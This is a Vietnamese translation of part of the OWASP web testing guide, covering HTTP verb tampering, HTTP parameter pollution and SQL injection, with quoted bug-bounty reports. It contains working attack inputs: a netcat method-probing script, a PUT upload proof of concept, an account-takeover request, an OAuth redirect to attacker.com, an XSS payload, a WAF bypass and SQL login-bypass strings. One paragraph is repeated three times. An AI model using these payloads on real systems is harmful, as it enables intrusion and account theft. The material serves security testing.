Đặc tả HTTP bao gồm các methods request khác với các yêu cầu GET và POST tiêu chuẩn. Một máy chủ web tuân thủ các tiêu chuẩn có thể đáp ứng các phương pháp thay thế này theo cách mà các nhà phát triển không lường trước được.

Thông số kỹ thuật HTTP 1.1 xác định các methods hoặc verbs yêu cầu HTTP hợp lệ sau:

```
OPTIONS
GET
HEAD
POST
PUT
DELETE
TRACE
CONNECT
```

Nếu được bật, tiện ích mở rộng  Web Distributed Authoring and Version (WebDAV) cho phép một số phương thức HTTP khác:

```
PROPFIND
PROPPATCH
MKCOL
COPY
MOVE
LOCK
UNLOCK
```

Tuy nhiên, hầu hết các ứng dụng web chỉ cần response các yêu cầu GET và POST, cung cấp dữ liệu người dùng trong chuỗi truy vấn URL hoặc được thêm vào yêu cầu tương ứng. Các liên kết kiểu `<a href=""></a>` tiêu chuẩn kích hoạt GET request; dữ liệu biểu mẫu được gửi qua `<form method='POST'></form>` kích hoạt các POST request. Các biểu mẫu được xác định không có phương thức cũng gửi dữ liệu qua GET theo mặc định.

Điều kỳ lạ là các phương thức HTTP hợp lệ khác không được tiêu chuẩn HTML hỗ trợ. Bất kỳ phương thức HTTP nào ngoài GET hoặc POST đều cần được gọi bên ngoài tài liệu HTML. Tuy nhiên, lệnh gọi JavaScript và AJAX có thể gửi các phương thức khác ngoài GET và POST.

Miễn là ứng dụng web đang được test không yêu cầu cụ thể bất kỳ phương thức HTTP không chuẩn nào, thì việc kiểm tra giả mạo HTTP verb khá đơn giản. Nếu máy chủ chấp nhận một yêu cầu khác với GET hoặc POST, quá trình kiểm tra sẽ không thành công. Giải pháp là vô hiệu hóa tất cả chức năng khác GET hoặc POST trong máy chủ ứng dụng web hoặc trong tường lửa ứng dụng web.

Nếu các phương pháp như HEAD hoặc OPTIONS được yêu cầu cho ứng dụng của bạn, điều này làm tăng đáng kể gánh nặng kiểm thử. Mỗi hành động trong hệ thống sẽ cần được xác minh rằng các phương pháp thay thế này không kích hoạt các hành động mà không có xác thực phù hợp hoặc tiết lộ thông tin về nội dung hoặc ứng dụng web đang hoạt động. Nếu có thể, hãy giới hạn việc sử dụng phương thức HTTP thay thế cho một trang không chứa hành động của người dùng, chẳng hạn như trang đích mặc định (ví dụ: index.html).

**How to Test**

*Manual HTTP verb tampering testing*

1. Crafting custom HTTP requests

    Mỗi yêu cầu HTTP 1.1 tuân theo định dạng và cú pháp cơ bản sau đây. Các phần tử được bao quanh bởi dấu ngoặc [ ] tùy theo ngữ cảnh của ứng dụng. Empty newline ở cuối là bắt buộc.

    ```
    [METHOD] /[index.htm] HTTP/1.1
    host: [www.example.com]

    ```

    Để tạo các yêu cầu riêng biệt, bạn có thể nhập thủ công từng yêu cầu vào netcat hoặc telnet và kiểm tra phản hồi. Tuy nhiên, để tăng tốc độ kiểm tra, bạn cũng có thể lưu trữ từng yêu cầu trong một tệp riêng biệt. Cách tiếp cận thứ hai này là những gì chúng ta sẽ chứng minh trong các ví dụ này. Sử dụng trình chỉnh sửa yêu thích của bạn để tạo tệp văn bản cho từng phương pháp. Sửa đổi cho trang đích và tên miền của ứng dụng của bạn.

    1.1 OPTIONS

    ```
    OPTIONS /index.html HTTP/1.1
    host: www.example.com

    ```

    1.2 GET

    ```
    GET /index.html HTTP/1.1
    host: www.example.com

    ```

    1.3 HEAD

    ```
    HEAD /index.html HTTP/1.1
    host: www.example.com

    ```

    1.4 POST

    ```
    POST /index.html HTTP/1.1
    host: www.example.com

    ```

    1.5 PUT

    ```
    PUT /index.html HTTP/1.1
    host: www.example.com
    
    ```

    1.6 DELETE

    ```
    DELETE /index.html HTTP/1.1
    host: www.example.com

    ```

    1.7 TRACE

    ```
    TRACE /index.html HTTP/1.1
    host: www.example.com

    ```

    1.8 CONNECT

    ```
    CONNECT /index.html HTTP/1.1
    host: www.example.com

    ```

2. Sending HTTP requests

    Đối với mỗi repquest, hãy gửi yêu cầu đến máy chủ web của bạn qua netcat hoặc telnet trên cổng 80 (HTTP):

    ```
    nc www.example.com 80 < OPTIONS.http.txt
    ```

3. Parsing HTTP responses

    Mặc dù mỗi phương thức HTTP có khả năng trả về các kết quả khác nhau, nhưng chỉ có một kết quả hợp lệ duy nhất cho tất cả các phương thức không phải là GET và POST. Máy chủ web nên bỏ qua yêu cầu hoàn toàn hoặc trả về lỗi. Bất kỳ phản hồi nào khác cho thấy lỗi kiểm tra vì máy chủ đang phản hồi các phương thức/động từ không cần thiết. Những phương pháp này nên được vô hiệu hóa.

    Một ví dụ về thử nghiệm không thành công (nghĩa là máy chủ hỗ trợ OPTIONS mặc dù không cần):

    ![](img/4-8/OPTIONS_verb_tampering.png)


*Automated HTTP verb tampering testing*

Nếu bạn có thể phân tích ứng dụng của mình thông qua mã trạng thái HTTP đơn giản (200 OK, Lỗi 501, v.v.) - thì tập lệnh bash sau sẽ kiểm tra tất cả các phương thức HTTP có sẵn.

```
#!/bin/bash

for webservmethod in GET POST PUT TRACE CONNECT OPTIONS PROPFIND;

do
printf "$webservmethod " ;
printf "$webservmethod / HTTP/1.1\nHost: $1\n\n" | nc -q 1 $1 80 | grep "HTTP/1.1"

done
```

##### Example report

Link to report: https://hackerone.com/reports/775560

**Description:**

Kiểm tra các phương thức HTTP được phép trên máy chủ.

**Steps to reproduce:**

1. Navigate the url
2. Chặn yêu cầu GET http bằng burp
3. thay đổi GET thành ABCD như trong ảnh chụp màn hình và chuyển tiếp yêu cầu này đến máy chủ
4. Quan sát phản hồi http từ máy chủ, nó hiển thị Cho phép tiêu đề và các phương thức http được bật trên máy chủ

    ![](img/4-8/ABCD_verb_tampering.png)

**Immpact:**

Có vẻ như không có tác động lớn nào Nếu người test nhận được thông báo "405 Method not allowed" hoặc "501 Method Unimplemented", nhưng ứng dụng đích hiển thị phương thức nào được phép trên máy chủ. ở đây trong trường hợp này có các phương thức PUT và DELETE được hiển thị. Sử dụng phương pháp này, kẻ tấn công có thể sử dụng khai thác để truy cập máy chủ hoặc tải tệp lên bằng phương pháp PUT.


Link to report: https://hackerone.com/reports/369581

**Summary:**

Có thể tải tệp lên máy chủ bằng phương thức PUT

**Steps to reproduce:**

1. Tôi đã sử dụng yêu cầu sau:

    ```
    PUT /emitrani.txt HTTP/1.1
    Host: ratelimited.me
    Content-Length: 10
    Connection: close

    emitrani POC
    ```

    Bây giờ một tệp tồn tại tại https://ratelimited.me/emitrani.txt
    với nội dung của yêu cầu đặt.

**Impact:**

Bất kỳ ai cũng có thể tải tệp lên máy chủ.





#### 4.8.4 OTG-INPVAL-004 (Testing for HTTP Parameter pollution)

##### Summary:

Việc cung cấp nhiều tham số HTTP có cùng tên có thể khiến ứng dụng diễn giải các giá trị theo những cách không lường trước được. Bằng cách khai thác các hiệu ứng này, kẻ tấn công có thể bỏ qua xác thực đầu vào, kích hoạt lỗi ứng dụng hoặc sửa đổi giá trị biến nội bộ. Vì HTTP Parameter Pollution (viết tắt là HPP) ảnh hưởng đến của tất cả các công nghệ web, nên tồn tại các cuộc tấn công phía client và server.

Các tiêu chuẩn HTTP hiện tại không bao gồm hướng dẫn về cách giải quyết nhiều tham số đầu vào có cùng tên. Chẳng hạn, RFC 3986 chỉ đơn giản định nghĩa thuật ngữ Chuỗi truy vấn là một chuỗi các cặp giá trị trường và RFC 2396 định nghĩa các lớp ký tự chuỗi truy vấn đảo ngược và không đặt trước. Không có tiêu chuẩn tại chỗ, các thành phần ứng dụng web xử lý trường hợp cạnh này theo nhiều cách khác nhau (xem bảng bên dưới để biết chi tiết).


Tự nó, đây không nhất thiết là một dấu hiệu của sự dễ bị tổn thương. Tuy nhiên, nếu nhà phát triển không nhận thức được sự cố, thì sự hiện diện của các tham số trùng lặp có thể tạo ra hành vi bất thường trong ứng dụng mà kẻ tấn công có thể khai thác. Như thường lệ trong bảo mật, các hành vi không mong muốn là nguồn điểm yếu thông thường có thể dẫn đến các cuộc tấn công HTTP Parameter Pollution trong trường hợp này. Để giới thiệu rõ hơn về loại lỗ hổng này và kết quả của các cuộc tấn công HPP, thật thú vị khi phân tích một số ví dụ thực tế đã được phát hiện trong quá khứ.

**Input Validation and filters bypass**

Vào năm 2009, ngay sau khi công bố nghiên cứu đầu tiên về HTTP Parameter Pollution, kỹ thuật này đã nhận được sự chú ý từ cộng đồng bảo mật như một cách khả thi để vượt qua tường lửa ứng dụng web.

Một trong những lỗi này, ảnh hưởng đến Quy tắc lõi ModSecurity SQL Injection, là một ví dụ hoàn hảo về sự không phù hợp trở kháng giữa các ứng dụng và bộ lọc. Bộ lọc ModSecurity sẽ đưa chuỗi sau vào danh sách đen một cách chính xác: `select 1,2,3 from table`, do đó chặn URL ví dụ này khỏi bị máy chủ web xử lý: `/index.aspx?page=select 1,2,3 from table`. Tuy nhiên, bằng cách khai thác việc nối nhiều tham số HTTP, kẻ tấn công có thể khiến máy chủ ứng dụng nối chuỗi sau khi bộ lọc ModSecurity đã chấp nhận đầu vào. Ví dụ: URL `/index.aspx?page=select 1&page=2,3 from tabe` sẽ không kích hoạt bộ lọc ModSecurity, nhưng lớp ứng dụng sẽ nối đầu vào trở lại thành chuỗi độc hại đầy đủ.

Một lỗ hổng khác của HPP hóa ra lại ảnh hưởng đến Apple Cups, hệ thống in nổi tiếng được sử dụng bởi nhiều hệ thống UNIX. Khai thác HPP, kẻ tấn công có thể dễ dàng kích hoạt lỗ hổng Cross-Site Scripting bằng cách sử dụng URL sau: `http://127.0.0.1:631/admin/?kerberos=onmouseover=alert(1)&kerberos`. Có thể bỏ qua điểm kiểm tra xác thực ứng dụng bằng cách thêm đối số kerberos bổ sung có chuỗi hợp lệ (ví dụ: chuỗi trống). Vì điểm kiểm tra xác thực sẽ chỉ xem xét lần xuất hiện thứ hai nên tham số kerberos đầu tiên không được làm sạch đúng cách trước khi được sử dụng để tạo nội dung HTML động. Việc khai thác thành công sẽ dẫn đến việc thực thi mã Javascript.

*Authentication bypass*

Một lỗ hổng HPP thậm chí còn nghiêm trọng hơn đã được phát hiện trong Blogger, nền tảng viết blog phổ biến. Lỗi này cho phép người dùng độc hại chiếm quyền sở hữu blog của nạn nhân bằng cách sử dụng yêu cầu HTTP sau:

```
POST /add-authors.do HTTP/1.1

security_token=attackertoken&blogID=attackerblogidvalue&blogID=victimblogidvalue&authorsList=goldshlager19test%40gmail.com(attacker email)&ok=Invite
```


Lỗ hổng nằm trong cơ chế xác thực được sử dụng bởi ứng dụng web, vì kiểm tra bảo mật được thực hiện trên tham số blogID đầu tiên, trong khi hoạt động thực tế sử dụng lần xuất hiện thứ hai.

Lỗ hổng nằm trong cơ chế xác thực được sử dụng bởi ứng dụng web, vì kiểm tra bảo mật được thực hiện trên tham số blogID đầu tiên, trong khi hoạt động thực tế sử dụng lần xuất hiện thứ hai.

Lỗ hổng nằm trong cơ chế xác thực được sử dụng bởi ứng dụng web, vì kiểm tra bảo mật được thực hiện trên tham số blogID đầu tiên, trong khi hoạt động thực tế sử dụng lần xuất hiện thứ hai.

**Expected Behavior by Application Server:**

Bảng sau đây minh họa cách các công nghệ web khác nhau hoạt động khi có nhiều lần xuất hiện cùng một tham số HTTP.


Đưa ra URL và chuỗi truy vấn: http://example.com/?color=red&color=blue


|Web Application Server Backend |	Parsing Result	| Example|
|-                              |-                  |-          |
|ASP.NET / IIS | All occurrences concatenated with a comma | color=red,blue|
|ASP / IIS | All occurrences concatenated with a comma | color=red,blue|
|PHP / Apache | Last occurrence only | color=blue|
|PHP / Zeus | Last occurrence only | color=blue|
|JSP, Servlet / Apache Tomcat | First occurrence only | color=red|
|JSP, Servlet / Oracle Application Server 10g | First occurrence only | color=red|
|JSP, Servlet / Jetty | First occurrence only | color=red|
|IBM Lotus Domino | Last occurrence only | color=blue|
|IBM HTTP Server | First occurrence only | color=red|
|mod_perl, libapreq2 / Apache | First occurrence only | color=red
|Perl CGI / Apache | First occurrence only | color=red\
|mod_wsgi (Python) / Apache | First occurrence only | color=red|
|Python / Zope | All occurrences in List data type | color=['red','blue']|


**How to Test**

May mắn thay, vì việc gán tham số HTTP thường được xử lý thông qua máy chủ ứng dụng web chứ không phải chính mã ứng dụng, nên việc kiểm tra phản hồi đối với ô nhiễm tham số phải là tiêu chuẩn trên tất cả các trang và hành động. Tuy nhiên, vì kiến ​​thức logic kinh doanh chuyên sâu là cần thiết, nên việc kiểm tra HPP yêu cầu kiểm tra thủ công. Các công cụ tự động chỉ có thể hỗ trợ một phần cho kiểm toán viên vì chúng có xu hướng tạo ra quá nhiều thông tin sai lệch. Ngoài ra, HPP có thể tự biểu hiện trong các thành phần phía máy khách và phía máy chủ.

*Server-side HPP*

Để kiểm tra các lỗ hổng HPP, hãy xác định bất kỳ hình thức hoặc hành động nào cho phép đầu vào do người dùng cung cấp. Các tham số chuỗi truy vấn trong yêu cầu HTTP GET dễ dàng tinh chỉnh trong thanh điều hướng của trình duyệt. Nếu hành động biểu mẫu gửi dữ liệu qua POST, người kiểm tra sẽ cần sử dụng proxy chặn để can thiệp vào dữ liệu POST khi dữ liệu được gửi đến máy chủ. Khi đã xác định một tham số đầu vào cụ thể để kiểm tra, người ta có thể chỉnh sửa dữ liệu GET hoặc POST bằng cách chặn yêu cầu hoặc thay đổi chuỗi truy vấn sau khi tải trang phản hồi. Để kiểm tra các lỗ hổng HPP, chỉ cần thêm cùng một tham số vào dữ liệu GET hoặc POST nhưng với một giá trị được gán khác.

Ví dụ: nếu kiểm tra tham số `search_string` trong chuỗi truy vấn, thì URL yêu cầu sẽ bao gồm tên và giá trị của tham số đó.
```
http://example.com/?search_string=kittens
```
Tham số cụ thể có thể bị ẩn giữa một số tham số khác, nhưng cách tiếp cận là như nhau; để nguyên các tham số khác và nối thêm bản sao.
```
http://example.com/?mode=guest&search_string=kittens&num_results=100
```
Nối cùng một tham số với một giá trị khác
http://example.com/?mode=guest&search_string=kittens&num_results=100&search_string=puppies
và gửi yêu cầu mới.

Phân tích trang phản hồi để xác định (các) giá trị nào đã được phân tích cú pháp. Trong ví dụ trên, kết quả tìm kiếm có thể hiển thị `kittens`, `puppies`, một số kết hợp của cả hai (`kittens, puppies` hoặc `kittens~puppies` hoặc `['kittens','puppies']`), có thể cho kết quả trống hoặc trang lỗi.

Hành vi này, cho dù sử dụng tên đầu tiên, họ hoặc kết hợp các tham số đầu vào có cùng tên, rất có khả năng nhất quán trên toàn bộ ứng dụng. Hành vi mặc định này có tiết lộ lỗ hổng tiềm ẩn hay không tùy thuộc vào quá trình xác thực và lọc đầu vào cụ thể cho một ứng dụng cụ thể. Theo nguyên tắc chung: nếu xác thực đầu vào hiện tại và các cơ chế bảo mật khác là đủ trên một đầu vào và nếu máy chủ chỉ gán các tham số bị ô nhiễm đầu tiên hoặc cuối cùng, thì ô nhiễm tham số không tiết lộ lỗ hổng. Nếu các tham số trùng lặp được nối với nhau, các thành phần ứng dụng web khác nhau sử dụng các lần xuất hiện khác nhau hoặc thử nghiệm sẽ tạo ra lỗi, thì sẽ có nhiều khả năng sử dụng ô nhiễm tham số để kích hoạt các lỗ hổng bảo mật.

Một phân tích sâu hơn sẽ yêu cầu ba request HTTP cho mỗi tham số HTTP:

1. Gửi một yêu cầu HTTP chứa tên và giá trị tham số chuẩn, đồng thời ghi lại phản hồi HTTP. Ví dụ. `page?par1=val1`
2. Thay thế giá trị tham số bằng giá trị giả mạo, gửi và ghi lại phản hồi HTTP. Ví dụ `page?par1=HPP_TEST1`
3. Gửi một yêu cầu mới kết hợp bước (1) và (2). Một lần nữa, hãy lưu phản hồi HTTP. Ví dụ. `page?par1=val1&par1=HPP_TEST1`
4. So sánh các phản hồi thu được trong tất cả các bước trước đó. Nếu phản hồi từ (3) khác với (1) và phản hồi từ (3) cũng khác với (2), thì có sự không phù hợp trở kháng mà cuối cùng có thể bị lạm dụng để kích hoạt các lỗ hổng HPP.

Tạo ra một khai thác đầy đủ từ một điểm yếu ô nhiễm tham số nằm ngoài phạm vi của văn bản này. Xem các tài liệu tham khảo cho các ví dụ và chi tiết.

*Client-side HPP*

Tương tự như HPP phía máy chủ, kiểm tra thủ công là kỹ thuật đáng tin cậy duy nhất để kiểm tra các ứng dụng web nhằm phát hiện các lỗ hổng ô nhiễm tham số ảnh hưởng đến các thành phần phía máy khách. Trong khi ở biến thể phía máy chủ, kẻ tấn công tận dụng một ứng dụng web dễ bị tổn thương để truy cập dữ liệu được bảo vệ hoặc thực hiện các hành động không được phép hoặc không được phép thực hiện, các cuộc tấn công phía máy khách nhằm mục đích phá hoại các thành phần và công nghệ phía máy khách.

Để kiểm tra các lỗ hổng phía máy khách HPP, hãy xác định bất kỳ biểu mẫu hoặc hành động nào cho phép người dùng nhập và hiển thị kết quả của dữ liệu nhập đó cho người dùng. Trang tìm kiếm là lý tưởng, nhưng hộp đăng nhập có thể không hoạt động (vì nó có thể không hiển thị lại tên người dùng không hợp lệ cho người dùng).

Tương tự như HPP phía máy chủ, làm ô nhiễm từng tham số HTTP bằng `%26HPP_TEST` và tìm kiếm các lần xuất hiện được giải url-decode của payload do người dùng cung cấp:
```
&HPP_TEST
&amp;HPP_TEST
… và những người khác
```

Cụ thể, hãy chú ý đến các phản hồi có vectơ HPP trong attribute `data`, `src`, `href` hoặc hành động biểu mẫu. Một lần nữa, hành vi mặc định này có tiết lộ lỗ hổng tiềm ẩn hay không tùy thuộc vào logic nghiệp vụ ứng dụng, lọc và xác thực đầu vào cụ thể. Ngoài ra, điều quan trọng cần lưu ý là lỗ hổng này cũng có thể ảnh hưởng đến các tham số chuỗi truy vấn được sử dụng trong XMLHttpRequest (XHR), tạo thuộc tính thời gian chạy và các công nghệ plugin khác (ví dụ: các biến flashvars của Adobe Flash).


##### Example report

Link to report: https://hackerone.com/reports/114169

CHÀO,
Tôi muốn báo cáo sự cố về xác thực web Digits cho phép kẻ tấn công truy xuất dữ liệu thông tin xác thực OAuth của nạn nhân ứng dụng được ủy quyền.

**Summary:**

Như được mô tả trong #108429, trang đăng nhập có 2 tham số, Consumer_key và host. Cái trước xác định ứng dụng mà người dùng muốn xác thực và cái sau chỉ định miền nào dữ liệu thông tin xác thực OAuth được gửi tới sau khi xác thực. Để ngăn các trang web khác giả làm ứng dụng, param host sẽ được xác thực để xem liệu nó có khớp với miền đã đăng ký của ứng dụng hay không. Lấy Periscope làm ví dụ:
```
https://www.digits.com/login?consumer_key=9I4iINIyd0R01qEPEwT9IC6RE&host=https%3A%2F%2Fwww.periscope.tv

```
host=https://www.periscope.tv khớp với miền đã đăng ký

```
https://www.digits.com/login?consumer_key=9I4iINIyd0R01qEPEwT9IC6RE&host=https%3A%2F%2Fattacker.com
```

host=https://attacker.com không khớp với tên miền đã đăng ký, do đó trang sẽ hiển thị lỗi.

Tuy nhiên, có thể bỏ qua việc xác thực bằng HPP (HTTP Parameter Pollution). Nếu chúng tôi cung cấp nhiều tham số máy chủ, quá trình xác thực sẽ chỉ so sánh tham số đầu tiên nhưng thay vào đó, tham số cuối cùng được sử dụng trong bước chuyển.

Ví dụ:

```
https://www.digits.com/login?consumer_key=9I4iINIyd0R01qEPEwT9IC6RE&host=https%3A%2F%2Fwww.periscope.tv&host=https%3A%2F%2Fattacker.com
```

First host (host=https://www.periscope.tv) được validate chứ không phải second host. Sau khi xác thực, second host (host=https://attacker.com) được sử dụng làm host chuyển giao thông tin.

**Step to reproduce:**
1. Chuẩn bị một tài khoản Periscope được liên kết với một số điện thoại
2. Đăng nhập vào Periscope bằng số điện thoại có luồng digits web login: http://innerht.ml/pocs/digits-host-validation-bypass-hpp/
3. Sau đó, tài khoản của bạn sẽ được đổi tên thành "Pwn3d"

**Impact:**
Nó ảnh hưởng đến mọi ứng dụng có Chữ số tích hợp và thậm chí cả ứng dụng chính thức (Periscope). Kẻ tấn công có thể lợi dụng lỗ hổng để đăng nhập vào tài khoản của nạn nhân trên các ứng dụng bị ảnh hưởng.

**Fix:**
Đảm bảo máy chủ được xác thực giống với máy chủ được sử dụng làm máy chủ truyền hoặc trả về lỗi nếu phát hiện thấy HPP



#### 4.8.5 OTG-INPVAL-005 (Testing for SQL Injection)

##### Summary:

Một cuộc tấn công SQL injection bao gồm việc chèn hoặc "tiêm" một truy vấn SQL một phần hoặc toàn bộ thông qua đầu vào dữ liệu hoặc được truyền từ máy khách (trình duyệt) đến ứng dụng web. Một cuộc tấn công SQL injection thành công có thể đọc dữ liệu nhạy cảm từ cơ sở dữ liệu, sửa đổi dữ liệu cơ sở dữ liệu (chèn/cập nhật/xóa), thực hiện các thao tác quản trị trên cơ sở dữ liệu (chẳng hạn như tắt DBMS), khôi phục nội dung của một tệp đã cho hiện có trên tệp DBMS hệ thống hoặc ghi tệp vào hệ thống tệp và trong một số trường hợp, ra lệnh cho hệ điều hành. Các cuộc tấn công SQL injection là một kiểu injection attack, trong đó các lệnh SQL được đưa vào đầu vào của data-plane để tác động đến việc thực thi các lệnh SQL được xác định trước.

Nói chung, cách các ứng dụng web xây dựng các câu lệnh SQL liên quan đến cú pháp SQL do các lập trình viên viết được trộn lẫn với dữ liệu do người dùng cung cấp. Ví dụ:

```
select title, text from news where id=$id
```

Trong ví dụ trên, biến $id chứa dữ liệu do người dùng cung cấp, trong khi phần còn lại là phần tĩnh SQL do lập trình viên cung cấp; tạo ra câu lệnh dynamic SQL.

Do cách nó được xây dựng, người dùng có thể cung cấp đầu vào được tạo thủ công để cố gắng làm cho câu lệnh SQL ban đầu thực hiện các hành động tiếp theo do người dùng lựa chọn. Ví dụ dưới đây minh họa dữ liệu do người dùng cung cấp “10 or 1=1”, thay đổi logic của câu lệnh SQL, sửa đổi mệnh đề WHERE thêm điều kiện “or 1=1”.

Các cuộc tấn công SQL Injection có thể được chia thành ba loại sau:

- Inband: dữ liệu được trích xuất bằng cùng một kênh được sử dụng để chèn mã SQL. Đây là kiểu tấn công đơn giản nhất, trong đó dữ liệu thu được được hiển thị trực tiếp trên trang web của ứng dụng.
- Out-of-band: dữ liệu được truy xuất bằng một kênh khác (ví dụ: email có kết quả của truy vấn được tạo và gửi đến người kiểm tra).
- Inferential hoặc Blind: không có chuyển dữ liệu thực tế, nhưng người kiểm tra có thể tái tạo lại thông tin bằng cách gửi các yêu cầu cụ thể và quan sát hành vi kết quả của DB Server.

Một cuộc tấn công SQL Injection thành công yêu cầu kẻ tấn công tạo một Truy vấn SQL chính xác về mặt cú pháp. Nếu ứng dụng trả về một thông báo lỗi được tạo bởi một truy vấn không chính xác, thì kẻ tấn công có thể dễ dàng xây dựng lại logic của truy vấn ban đầu và do đó, hiểu cách thực hiện thao tác tiêm một cách chính xác. Tuy nhiên, nếu ứng dụng ẩn các chi tiết lỗi, thì người kiểm tra phải có khả năng đảo ngược logic của truy vấn ban đầu.

Về các kỹ thuật khai thác lỗ hổng SQL injection, có năm kỹ thuật phổ biến. Ngoài ra, những kỹ thuật đó đôi khi có thể được sử dụng theo cách kết hợp (ví dụ: union operator và out-of-band):

- UNION Operator: có thể được sử dụng khi lỗ hổng SQL injection xảy ra trong câu lệnh SELECT, giúp có thể kết hợp hai truy vấn thành một kết quả hoặc tập kết quả duy nhất.
- Boolean: sử dụng (các) điều kiện Boolean để xác minh xem một số điều kiện là đúng hay sai.
- Error based: kỹ thuật này buộc cơ sở dữ liệu tạo ra lỗi, cung cấp cho kẻ tấn công hoặc người kiểm tra thông tin để tinh chỉnh nội dung injection của chúng.
- Out-of-band: kỹ thuật được sử dụng để truy xuất dữ liệu bằng một kênh khác (ví dụ: tạo kết nối HTTP để gửi kết quả đến máy chủ web).
- Time delay: sử dụng các lệnh cơ sở dữ liệu (ví dụ: sleep) để trì hoãn câu trả lời trong các truy vấn có điều kiện. Nó rất hữu ích khi kẻ tấn công không có một số loại response (resul, output hoặc error) từ ứng dụng.

**How to Test**

*Detection techniques*

Bước đầu tiên trong test này là hiểu khi nào ứng dụng tương tác với một DB Server để truy suất dữ liệu. Ví dụ điển hình của các trường hợp khi một ứng dụng cần giao tiếp với một DB Server bao gồm:

- Authentication forms: Khi việc xác thực sử dụng web form được diễn ra, rất có thể rằng thông tin đăng nhập của user sẽ được check với database nơi mà chứa tất cả thông tin về usernames và passwords (hoặc an toàn hơn là password đã bị hash)
- Search engines: Chuỗi được gửi bở người dùng có thể được sử dụng trong một câu SQL query, cái mà sẽ trích xuất tất cả các bản ghi có liên quan từ database.
- E-Commerce sites: Những sản phẩm và những thông tin liên quan (giá, mô tả, trạng thái,...) rất có khả năng được lưu trữ trong cơ sở dữ liệu.

Người kiểm thử phải tạo ra một list tất cả các input fields, cái mà value của nó có thể được sử dụng trong một SQL query, bao gồm cả hidden fields của POST requests và sau đó test chúng một cách riêng biệt, cố gắng can thiệp vào câu truy vấn và tạo ra lỗi. Ngoài ra cũng nên test thêm các HTTP headers và Cookies.

Test case đầu tiên thường bao gồm việc thêm dấu nháy đơn `'` hoặc dấu chấm phẩy `;` vào field hoặc param đang test. Cái đầu tiên (`'`) được sử dụng để đóng chuỗi và nếu nó không bị filter bởi ứng dụng nó sẽ dẫn đến một câu truy vấn sai. Cái thứ 2 (`;`) được sử dụng để kết thúc một câu truy vấn và nếu nó không được filter, nó cũng sẽ tạo ra lỗi.

Output của một vulnerable field có thể trông như sau (Microsoft SQL Server):
```
Microsoft OLE DB Provider for ODBC Drivers error '80040e14'
[Microsoft][ODBC SQL Server Driver][SQL Server]Unclosed quotation mark before the 
character string ''.
/target/target.asp, line 113
```

Ngoài ra cũng có thể sử dụng comment (-- hoặc /* */,...) và các SQL keywords khác như `AND` và `OR` có thể được sử dụng để sửa câu query. Một kỹ thuật rất đơn giản nhưng đôi khi vẫn hiệu quả vì có thể tạo ra lỗi như sau:

```
Microsoft OLE DB Provider for ODBC Drivers error '80040e07'
[Microsoft][ODBC SQL Server Driver][SQL Server]Syntax error converting the
varchar value 'test' to a column of data type int.
/target/target.asp, line 113
```

Quan sát tất cả các response từ web server và xem cả HTML/javascript source code. Đôi khi lỗi có tồn tại nhưng vì một vài lý do (javascript error, HTML comment,...) không hiển thị nó với người dùng. Toàn bộ một message thông báo lỗi giống như ví dụ cung cấp rất nhiều thông tin cho tester dẫn đến một cuộc tấn công injection thành công. Tuy nhiên, ứng dụng thường không cung cấp quá chi tiết: chỉ đơn giản '500 Server Error' hoặc một trang web được xây dựng để thông báo lỗi, điều này nghĩa là chúng ta cần sử dụng Blind injection techniques. Trong một số trường hợp, Việc test từng field một là rất quan trọng: chỉ field thay đổi trong khi các fields khác dữ nguyên sẽ giúp ta hiểu chính xác đâu là vulnerable param, đâu không phải.

*Standard SQL Injection Testing*

Example 1 (classical SQL Injection):

Quan sát câu SQL bên dưới:
```
SELECT * FROM Users WHERE Username='$username' AND Password='$password'
```

Một truy vấn tương tự thường được sử dụng từ ứng dụng web để xác thực người dùng. Nếu truy vấn trả về một giá trị, điều đó có nghĩa là bên trong cơ sở dữ liệu tồn tại một người dùng có bộ thông tin xác thực đó, thì người dùng đó được phép đăng nhập vào hệ thống, nếu không thì quyền truy cập sẽ bị từ chối. Các giá trị của các trường đầu vào thường được lấy từ người dùng thông qua một biểu mẫu web. Giả sử chúng ta chèn các giá trị Username và Password sau:
```
$username = 1' or '1' = '1
```
```
$password = 1' or '1' = '1
```

Câu truy vấn sẽ là:
```
SELECT * FROM Users WHERE Username='1' OR '1' = '1' AND Password='1' OR '1' = '1' 
```

Giả sử rằng giá trị của các param trên được gửi thông qua phương thức GET và trang web bị lỗi là trang `www.example.com`, thì request chúng ta gửi đến server sẽ có dạng như sau:
```
http://www.example.com/index.php?username=1'%20or%20'1'%20=%20'1&password=1'%20or%20'1'%20=%20'1 
```

Sau khi phân tích ta thấy rằng câu truy vấn trả về một (hoặc nhiều) các giá trị bởi vì điều kiện của query là luôn đúng (1=1). Theo cách này, hệ thống đã xác thực người dùng mà không cần biết username và password. 

Trong một số hệ thống hàng đầu tiên của bảng user sẽ là tài khoản admin. Tài khoản đó nó có lẽ sẽ được trả về trong một số trường hợp. Một số ví dụ khác về câu query như sau:

```
SELECT * FROM Users WHERE ((Username='$username') AND (Password=MD5('$password')))
```

Trong trường hợp này, có hai vấn đề, một do sử dụng dấu ngoặc đơn và một do sử dụng hàm hash MD5. Trước hết, chúng tôi giải quyết vấn đề về dấu ngoặc đơn. Điều đó chỉ đơn giản bao gồm việc thêm một số dấu ngoặc đơn đóng cho đến khi chúng tôi nhận được một truy vấn đã sửa. Để giải quyết vấn đề thứ hai, chúng tôi cố gắng trốn tránh điều kiện thứ hai. Chúng tôi thêm vào truy vấn của mình một ký hiệu comment đang bắt đầu. Theo cách này, mọi thứ theo sau ký tự như vậy được coi là một comment. Mọi DBMS đều có cú pháp comment riêng, tuy nhiên, một ký hiệu phổ biến đối với phần lớn cơ sở dữ liệu là /*. Trong Oracle ký hiệu là "--". Điều này nói rằng, các giá trị mà chúng tôi sẽ sử dụng làm Username dùng và Password là:

```
$username = 1' or '1' = '1'))/*
```
```
$password = foo
```

Bằng cách này chúng ta sẽ có được câu query như bên dưới:
```
SELECT * FROM Users WHERE ((Username='1' or '1' = '1'))/*') AND (Password=MD5('$password'))) 
```

Request trên url sẽ là:
```
http://www.example.com/index.php?username=1'%20or%20'1'%20=%20'1'))/*&password=foo 
```

Điều này có lẽ sẽ trả về một số các giá trị. Thỉnh thoảng, code xác thực kiểm tra số lượng bản ghi/kết quả trả về phải chính xác bằng 1. Trong ví dụ trước, trường hợp này sẽ trở nên khó hơn (trong database chỉ có 1 giá trị cho mỗi user). Để giải quyết vấn đề này, nó yêu cầu điều kiện về số kết quả trả về phải bằng 1. Để đạt được mục tiêu này chúng ta sử dụng toán tử `LIMIT <num>`, với `<num>` là số kết quả/bản ghi chúng ta muốn trả về. Dựa theo ví dụ trước ta sửa trường Username và Password như sau:
```
$username = 1' or '1' = '1')) LIMIT 1/*
```
```
$password = foo 
```
